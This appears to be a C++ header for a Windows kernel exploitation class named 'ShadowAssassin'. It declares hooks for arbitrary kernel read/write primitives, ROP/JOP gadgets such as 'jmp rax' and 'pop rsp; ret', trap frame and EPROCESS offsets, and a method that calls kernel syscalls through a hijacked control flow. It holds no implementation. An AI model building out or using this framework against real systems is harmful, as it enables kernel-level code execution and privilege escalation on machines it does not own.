#pragma once
#include "general.h"
#include <functional>
#include "framemanager.h"
#include "jopmanager.h"


class ShadowAssassin
{
private:
    std::function<void(UINT64*, UINT64, UINT64)> readFn;
    std::function<void(UINT64, UINT64)>          writeFn;

    UINT64 gadgetJmpRax;
    UINT64 gadgetPopRspRet;
    UINT64 scratchAddress;

    FrameManager frameManager;
    JOPManager   jopManager;

    UINT64 ResolveKernelExport(const std::string& name);

public:
    ShadowAssassin();

    void SetReadPrimitive(std::function<void(UINT64*, UINT64, UINT64)> fn);
    void SetWritePrimitive(std::function<void(UINT64, UINT64)> fn);
    void SetGadgetJmpRax(UINT64 offset);
    void SetGadgetPopRspRet(UINT64 offset);
    void SetScratchAddress(UINT64 addr);
    void SetTrapFrameOffset(UINT64 offset);
    void SetEPROCESS(UINT64 ep);

    bool Initialize();

    UINT64 CallSyscall(const std::string& name, const std::vector<UINT64>& params);

    FrameManager& GetFrameManager();
    JOPManager&   GetJOPManager();
};
